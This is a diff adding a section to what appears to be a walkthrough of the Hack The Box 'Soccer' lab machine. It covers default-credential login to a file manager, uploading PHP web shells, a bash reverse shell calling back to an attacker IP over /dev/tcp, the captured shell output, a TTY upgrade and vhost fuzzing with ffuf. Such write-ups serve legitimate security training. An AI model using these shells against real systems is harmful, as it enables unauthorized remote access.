@@ -149,10 +149,47 @@ And we see the tiny file manager at this directory: http://soccer.htb/tiny/
 
 We look up default credentials on Google and find this pair: admin/admin@123
 
-We enter it and miraculously it works.
+We enter it and miraculously it works:
 ![image tooltip](images\Screenshot 2025-04-25 192146.png)
 
+It seems that we can upload files, so since tiny file manager is a web-based php file manager, we try several php shells but the below cannot be uploaded:
+```
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4443 0>&1'");
+?>
+
+<?php system($_GET['cmd']);?>
+
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+We try a reverse shell that uses the fsockopen() function in php: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+and it works:
+```
+Listening on 0.0.0.0 4443
+Connection received on 10.10.11.194 51554
+Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 01:45:25 up 9 min,  0 users,  load average: 0.00, 0.04, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+We then use the following to upgrade our shell:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+suspend with CTRL - Z
+stty raw -echo
+fg
+export TERM=xterm
+```
 
 
 
+We try enumerating vhosts with ffuf:
+```
+ffuf -w SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://soccer.htb -H 'Host:FUZZ.soccer.htb' -fs 178
+```
 
